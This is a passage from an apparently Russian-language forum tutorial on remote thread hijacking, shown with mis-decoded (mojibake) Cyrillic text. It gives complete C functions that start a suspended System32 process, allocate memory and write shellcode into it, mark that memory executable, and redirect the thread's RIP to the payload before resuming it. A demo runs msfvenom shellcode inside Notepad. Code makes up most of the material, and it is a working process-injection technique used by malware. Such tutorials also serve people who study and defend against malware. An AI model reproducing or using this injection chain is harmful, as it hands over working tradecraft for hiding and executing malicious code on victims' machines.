–ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏.<br />
<br />
lpStartupInfo - —ç—Ç–æ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ STARTUPINFO, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç –¥–µ—Ç–∞–ª–∏, —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å —Å–æ–∑–¥–∞–Ω–∏–µ–º –ø—Ä–æ—Ü–µ—Å—Å–∞. –ï–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω—ã–π —ç–ª–µ–º–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –∑–∞–ø–æ–ª–Ω–∏—Ç—å, - —ç—Ç–æ DWORD cb, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π —Ä–∞–∑–º–µ—Ä —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –≤ –±–∞–π—Ç–∞—Ö.<br />
<br />
lpProcessInformation - —ç—Ç–æ –≤—ã—Ö–æ–¥–Ω–æ–π –ø–∞—Ä–∞–º–µ—Ç—Ä, –∫–æ—Ç–æ—Ä—ã–π –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É PROCESS_INFORMATION. –°—Ç—Ä—É–∫—Ç—É—Ä–∞ PROCESS_INFORMATION –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _PROCESS_INFORMATION {
  HANDLE hProcess;        // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.
  HANDLE hThread;         // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.
  DWORD  dwProcessId;     // –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞
  DWORD  dwThreadId;      // –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;</code></pre>
	</div>
</div><br />
–≠—Ç–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –Ω–æ–≤–æ—Å–æ–∑–¥–∞–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –∏ –µ–≥–æ –æ—Å–Ω–æ–≤–Ω–æ–º –ø–æ—Ç–æ–∫–µ.<br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è</b><br />
<br />
–ü–æ—Å–ª–µ–¥–Ω–∏–π –æ—Å—Ç–∞–≤—à–∏–π—Å—è –∫–æ–º–ø–æ–Ω–µ–Ω—Ç –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ - —ç—Ç–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø–æ–ª–Ω–æ–≥–æ –ø—É—Ç–∏ –∫ –ø—Ä–æ—Ü–µ—Å—Å—É.<br />
–ñ–µ—Ä—Ç–≤–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –±—É–¥–µ—Ç —Å–æ–∑–¥–∞–Ω –Ω–∞ –æ—Å–Ω–æ–≤–µ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞, –Ω–∞—Ö–æ–¥—è—â–µ–≥–æ—Å—è –≤ –∫–∞—Ç–∞–ª–æ–≥–µ System32. –ú–æ–∂–Ω–æ –ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏—Ç—å, —á—Ç–æ –ø—É—Ç—å –±—É–¥–µ—Ç C:\Windows\System32 –∏ –∂–µ—Å—Ç–∫–æ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞—Ç—å —ç—Ç–æ –∑–Ω–∞—á–µ–Ω–∏–µ, –Ω–æ –≤—Å–µ–≥–¥–∞ –±–µ–∑–æ–ø–∞—Å–Ω–µ–µ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø—É—Ç—å. –î<br />
–ª—è —ç—Ç–æ–≥–æ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è WinAPI GetEnvironmentVariableA.<br />
GetEnvironmentVariableA –∏–∑–≤–ª–µ–∫–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ —É–∫–∞–∑–∞–Ω–Ω–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –æ–∫—Ä—É–∂–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä–æ–π –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ –±—É–¥–µ—Ç &quot;WINDIR&quot;.<br />
<br />
&quot;WINDIR&quot; - —ç—Ç–æ –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –æ–∫—Ä—É–∂–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä–∞—è —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –∫–∞—Ç–∞–ª–æ–≥ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã Windows. –ù–∞ –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–µ —Å–∏—Å—Ç–µ–º —ç—Ç–æ—Ç –∫–∞—Ç–∞–ª–æ–≥ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ &quot;C:\Windows&quot;. –ó–Ω–∞—á–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –æ–∫—Ä—É–∂–µ–Ω–∏—è &quot;WINDIR&quot; –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å, –≤–≤–µ–¥—è &quot;echo %WINDIR%&quot; –≤ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–µ –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –≤–≤–µ–¥—è %WINDIR% –≤ —Å—Ç—Ä–æ–∫–µ –ø–æ–∏—Å–∫–∞ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞ —Ñ–∞–π–ª–æ–≤.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD GetEnvironmentVariableA(
  [in, optional]  LPCSTR lpName,
  [out, optional] LPSTR  lpBuffer,
  [in]            DWORD  nSize
);</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∏—è –∂–µ—Ä—Ç–≤–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è CreateSuspendedProcess –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∂–µ—Ä—Ç–≤–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏. –û–Ω–∞ —Ç—Ä–µ–±—É–µ—Ç 4 –∞—Ä–≥—É–º–µ–Ω—Ç–∞:<br />
<ul>
<li data-xf-list-type="ul">lpProcessName - –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è.</li>
<li data-xf-list-type="ul">dwProcessId - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ DWORD, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∞–µ—Ç –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ul">hProcess - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ HANDLE, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ul">hThread - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ HANDLE, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞.</li>
</ul>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    // –û—á–∏—Å—Ç–∫–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—è –∑–Ω–∞—á–µ–Ω–∏—è —á–ª–µ–Ω–æ–≤ –≤ 0
    RtlSecureZeroMemory(&amp;Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ä–∞–∑–º–µ—Ä–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
    Si.cb = sizeof(STARTUPINFO);

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –æ–∫—Ä—É–∂–µ–Ω–∏—è %WINDIR%
    if (!GetEnvironmentVariableA(&quot;WINDIR&quot;, WnDr, MAX_PATH)) {
        printf(&quot;[!] GetEnvironmentVariableA Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª–Ω–æ–≥–æ –ø—É—Ç–∏ –∫ —Ü–µ–ª–µ–≤–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É
    sprintf(lpPath, &quot;%s\\System32\\%s&quot;, WnDr, lpProcessName);
    printf(&quot;\n\t[i] Running : \&quot;%s\&quot; ... &quot;, lpPath);

    if (!CreateProcessA(
        NULL,                   // –ù–µ—Ç –∏–º–µ–Ω–∏ –º–æ–¥—É–ª—è (–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥–Ω—É—é —Å—Ç—Ä–æ–∫—É)
        lpPath,                 // –ö–æ–º–∞–Ω–¥–Ω–∞—è —Å—Ç—Ä–æ–∫–∞
        NULL,                   // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–µ –Ω–∞—Å–ª–µ–¥—É–µ—Ç—Å—è
        NULL,                   // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞ –Ω–µ –Ω–∞—Å–ª–µ–¥—É–µ—Ç—Å—è
        FALSE,                  // –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –Ω–∞—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –≤ FALSE
        CREATE_SUSPENDED,       // –§–ª–∞–≥ —Å–æ–∑–¥–∞–Ω–∏—è
        NULL,                   // –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –æ–∫—Ä—É–∂–µ–Ω–∏–µ —Ä–æ–¥–∏—Ç–µ–ª—è
        NULL,                   // –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ä–∞–±–æ—á–∏–π –∫–∞—Ç–∞–ª–æ–≥ —Ä–æ–¥–∏—Ç–µ–ª—è
        &amp;Si,                    // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É STARTUPINFO
        &amp;Pi)) {                 // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É PROCESS_INFORMATION

        printf(&quot;[!] CreateProcessA Failed with Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;[+] DONE \n&quot;);

    // –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –≤—ã—Ö–æ–¥–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏ CreateProcessA
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ –ø–æ–ª—É—á–µ–Ω—ã –≤—Å–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è
    if (*dwProcessId != NULL &amp;&amp; *hProcess != NULL &amp;&amp; *hThread != NULL)
        return TRUE;

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å</b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º –ø–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏ —è–≤–ª—è–µ—Ç—Å—è –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ InjectShellcodeToRemoteProcess.<br />
–ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å, –Ω–æ –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è. –ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –∑–∞—Ç–µ–º —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –¥–ª—è –ø–æ—Å–ª–µ–¥—É—é—â–µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —á–µ—Ä–µ–∑ –ø–æ—Ö–∏—â–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
    SIZE_T sNumberOfBytesWritten = NULL;
    DWORD dwOldProtection = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf(&quot;\n\t[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }
    printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, *ppAddress);

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &amp;sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf(&quot;\n\t[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;\n\t[!] VirtualProtectEx Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è –ø–æ—Ö–∏—â–µ–Ω–∏—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞</b><br />
<br />
–ü–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –∑–∞–ø–∏—Å–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å, –∑–∞–∫–ª—é—á–∏—Ç–µ–ª—å–Ω—ã–π —ç—Ç–∞–ø –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –ø–æ—Ç–æ–∫–∞, –≤–æ–∑–≤—Ä–∞—â–µ–Ω–Ω–æ–≥–æ CreateSuspendedProcess, —á—Ç–æ–±—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ—Ö–∏—â–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞. –≠—Ç–∞ —á–∞—Å—Ç—å —Ç–∞–∫–∞—è –∂–µ, –∫–∞–∫ –∏ —Ç–∞, —á—Ç–æ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–ª–∞—Å—å –≤ —á–∞—Å—Ç–∏ –ø–æ—Ö–∏—â–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞.<br />
<br />
–í –∫–∞—á–µ—Å—Ç–≤–µ –∏—Ç–æ–≥–∞, —Ñ—É–Ω–∫—Ü–∏—è GetThreadContext –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –ø–æ—Ç–æ–∫–∞, –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞ RIP, —É–∫–∞–∑—ã–≤–∞—é—â–µ–≥–æ –Ω–∞ –∑–∞–ø–∏—Å–∞–Ω–Ω—É—é –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –≤—ã–∑–æ–≤–∞ SetThreadContext –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –ø–æ—Ç–æ–∫–∞ –∏, –Ω–∞–∫–æ–Ω–µ—Ü, –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è ResumeThread –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />
<b>–í—Å–µ —ç—Ç–æ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–∏–∂–µ, HijackThread, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–≤–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞:</b><br />
<ul>
<li data-xf-list-type="ul">hThread - –ø–æ—Ç–æ–∫ –¥–ª—è –ø–æ—Ö–∏—â–µ–Ω–∏—è.</li>
<li data-xf-list-type="ul">pAddress - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞.</li>
</ul>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
    CONTEXT ThreadCtx = {
        .ContextFlags = CONTEXT_CONTROL
    };

    // –ø–æ–ª—É—á–µ–Ω–∏–µ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –ø–æ—Ç–æ–∫–∞
    if (!GetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\n\t[!] GetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ —Å–ª–µ–¥—É—é—â—É—é –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é, —á—Ç–æ–±—ã –æ–Ω –±—ã–ª —Ä–∞–≤–µ–Ω –∞–¥—Ä–µ—Å—É –Ω–∞—à–µ–≥–æ —à–µ–ª–ª–∫–æ–¥–∞
    ThreadCtx.Rip = pAddress;

    // —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –Ω–æ–≤–æ–≥–æ –æ–±–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –ø–æ—Ç–æ–∫–∞
    if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\n\t[!] SetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –≤–æ–∑–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞, —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º –∑–∞–ø—É—Å–∫–∞—è –Ω–∞—à—É –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É
    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ</b><br />
<br />
–í —ç—Ç–æ–π –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è Notepad.exe –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∂–µ—Ä—Ç–≤–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –µ–≥–æ –ø–æ—Ç–æ–∫ –ø–æ—Ö–∏—â–∞–µ—Ç—Å—è –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è shellcode –æ—Ç Msfvenom –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781127213.png"
		data-src="https://osint42.org/attachments/1746781127213-png.125/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781127213-png.125/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781127213.png"
			title="1746781127213.png"
			width="1250" height="848" loading="lazy" />
	</div><br />
<br />
<br />
<b>–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω—ã—Ö –ø–æ—Ç–æ–∫–æ–≤</b><br />
<br />
–î–æ —Å–∏—Ö –ø–æ—Ä, –∫–æ–≥–¥–∞ –ø—Ä–æ–∏–∑–≤–æ–¥–∏–ª–æ—Å—å –ø–æ—Ö–∏—â–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞, —Ü–µ–ª–µ–≤–æ–π –ø–æ—Ç–æ–∫ —Å–æ–∑–¥–∞–≤–∞–ª—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º CreateThread, –∏ –µ–≥–æ –∫–æ–Ω—Ç–µ–∫—Å—Ç –∏–∑–º–µ–Ω—è–ª—Å—è. –í —ç—Ç–æ–π —á–∞—Å—Ç–∏ –±—É–¥–µ—Ç –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–º —Ä–∞–±–æ—Ç–∞—é—â–∏–µ –ø–æ—Ç–æ–∫–∏ —Å–∏—Å—Ç–µ–º—ã –ø–µ—Ä–µ—á–∏—Å–ª—è—é—Ç—Å—è —Å –ø–æ–º–æ—â—å—é CreateToolhelp32Snapshot, –∞ –∑–∞—Ç–µ–º –ø–æ—Ö–∏—â–∞—é—Ç—Å—è.<br />
<br />
<b>–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–æ–≤</b><br />
<br />
